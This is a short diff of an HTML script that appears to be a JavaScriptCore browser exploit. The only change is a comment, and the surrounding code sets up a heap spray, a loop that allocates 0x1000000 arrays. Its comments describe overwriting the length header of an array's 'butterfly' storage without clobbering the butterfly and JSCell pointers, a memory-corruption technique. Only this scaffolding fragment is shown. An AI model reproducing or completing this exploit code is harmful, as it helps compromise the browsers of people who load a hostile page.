@@ -1,7 +1,7 @@
 <script>
 // If all else fails, use that second garbage collection function.
 var worker = null;
-// Setup spray to overwrite the length header in the butterfly. Adjust "arrayLength" in these sprays so that no pointers are overwritten, which would cause a loss of the reference.
+// Setup spray to overwrite the length header in the butterfly. Adjust "arrayLength" in these sprays so that no pointers (such as the pointers to the butterfly and JSCell) are overwritten, which would cause a loss of the reference.
 var butterflySpray = new Array(0x1000000);
 for (var i = 0; i < 0x1000000; i++) {
 	butterflySpray[i] = [];
